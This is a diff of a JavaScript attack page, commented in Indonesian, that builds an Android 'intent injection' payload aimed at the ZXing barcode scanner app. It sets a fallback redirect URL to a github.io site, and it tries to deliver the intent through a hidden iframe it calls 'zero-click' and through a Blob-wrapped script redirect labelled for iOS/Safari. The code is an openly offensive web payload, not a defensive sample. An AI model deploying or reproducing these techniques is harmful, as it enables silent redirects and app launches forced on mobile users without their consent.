@@ -55,15 +55,13 @@
   // ============================================
   // 1. KONFIGURASI PAYLOAD (INTENT INJECTION)
   // ============================================
-  // URL Fallback: Jika aplikasi ZXing tidak terinstal, 
-  // Chrome akan mencoba membuka URL ini.
-  var zombieStreamUrl = "https://google.com/search?q=malicious+payload";
+  // URL Fallback: Jika ZXing tidak terinstal, browser akan redirect ke sini.
+  var fallbackUrl = "https://artha231.github.io/";
   
-  // Encode URL fallback dengan benar (perbaikan typo)
-  var encodedFallback = encodeURIComponent(zombieStreamUrl);
+  // Encode URL fallback
+  var encodedFallback = encodeURIComponent(fallbackUrl);
 
   // Intent yang dimodifikasi
-  // Catatan: Format Intent URI di Android harus tepat agar valid.
   var maliciousIntent = "intent://scan/#Intent;" +
                         "scheme=zxing;" +
                         "package=com.google.zxing.client.android;" +
@@ -87,7 +85,7 @@
       log("[-] Gagal: " + e.message);
     }
 
-    // Trik 2: Iframe tersembunyi (Fallback Redirect)
+    // Trik 2: Iframe tersembunyi (Zero-Click Iframe)
     setTimeout(function() {
       var iframe = document.createElement('iframe');
       iframe.style.display = 'none';
@@ -96,7 +94,7 @@
       log("[+] Intent via Iframe dicoba.");
     }, 500);
 
-    // Trik 3: Blob Wrapper
+    // Trik 3: Blob Wrapper (Untuk iOS/Safari)
     setTimeout(function() {
       try {
         var blobPayload = `<script>window.location.href = "${maliciousIntent}";<\/script>`;
